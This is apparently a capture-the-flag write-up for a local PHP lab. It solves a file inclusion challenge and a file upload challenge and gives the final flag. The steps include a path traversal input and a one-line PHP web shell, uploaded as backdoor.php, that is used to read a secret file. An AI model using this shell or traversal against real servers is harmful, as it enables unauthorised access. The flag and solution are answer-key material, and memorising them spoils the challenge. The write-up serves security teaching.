# Writeup

Github Repo - https://github.com/kavyaharlalka/CtfFileUpload

Overview
The goal of this challenge is to use a PHP file inclusion vulnerability and a file upload exploit to obtain access to secret files on the server. A web application that enables users to upload files and see them on a website is the subject of the challenge. However, a PHP file inclusion attack can take advantage of the application's vulnerability to include and run any PHP code. The program also has a file upload capability that is open to file upload attacks, enabling attackers to upload malicious PHP files to the server. To complete the challenge, competitors must upload a PHP shell to the server and execute the shell using the PHP file inclusion vulnerability. The hidden directory, which houses the flag, may then be found by browsing the server's filesystem from that point.

Challenge 1: Exploit a vulnerability in the given PHP file inclusion functionality.
Challenge 2: Exploit a vulnerability in the given PHP file upload functionality.


Instructions on how to solve it :-
1.	Access localhost:8000
2.	Go to Challenge 1
3.	Search for “../../secret”
4.	Copy the flag you see (call it flag1)
5.	Go back to localhost:8000
6.	Go to Challenge 2
7.	Upload a php script (let’s say backdoor.php) with “<?php system($_GET['cmd']); ?>”
8.	Access localhost:8000/challenge2/uploads/backdoor.php?cmd=cat%20secret.php
9.	Check the network tab with the above request; you will find the flag in the response (lets call it flag2)
10.	Concatenate both flags and enclose them in `CTF_SDaT{}` to get the final flag.

Final Flag - CTF_SDaT{f1l3_inclu510n_vuln3r4b1l1ty_@nd_uPload_3xplo1t}